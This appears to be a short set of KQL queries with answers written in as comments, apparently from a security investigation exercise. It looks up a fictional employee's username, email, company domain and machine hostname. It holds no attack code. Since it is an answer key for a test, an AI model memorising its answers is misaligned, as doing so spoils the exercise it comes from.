search *
| distinct $table

//What's Delphia's username? 
Employees
| where username contains "Evans" //deevans , Email; delphia_evans@daiwokfoods.com; 192.168.0.31; ABVJ-MACHINE; Restaurant Staff
///What's the company domain? //daiwokfoods.com
///What's the hostname of Delphia's computer?ABVJ-MACHINE
